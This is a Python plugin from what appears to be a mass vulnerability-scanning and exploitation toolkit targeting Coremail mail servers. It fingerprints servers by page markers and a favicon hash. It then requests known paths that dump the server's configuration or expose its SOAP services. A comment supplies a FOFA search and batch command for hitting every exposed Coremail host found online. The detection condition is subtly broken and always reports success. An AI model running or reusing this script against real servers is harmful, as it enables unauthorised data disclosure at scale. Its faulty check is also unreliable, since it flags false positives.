# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# fofa: app="coremail"
# python3 batch.py -m exploit.scripts.Mail.Coremail.sensitive -cs -fs "app=\"coremail\""


class Script(BaseScript):
    name = 'Coremail Mail'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.MEDIUM
        # 类型
        self.bug_type = BugType.SENSITIVE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # priority
        self.priority = 1
        # exec
        self.exec_path_list = ['/mailsms/s?func=ADMIN:appState&dumpConfig=/', '/apiws/services/']
        # 相关信息
        self.info = ''
        # favicon
        self.favicon = ['ad74ff8f9a2f630fc2c5e6b3aa0a5cb8']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and ('/coremail/bundle/' in text or '<a href="http://www.coremail.cn" target="_blank">' in text or 'coremail/common' in text or 'action="/coremail/index.jsp' in text or r'''fmt_logoalt: "coremail 电子邮件系统''' in text):
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, timeout=self.req_timeout, headers=self.headers)
                if text is not None and ('S_OK' in text or 'SOAP services'):
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
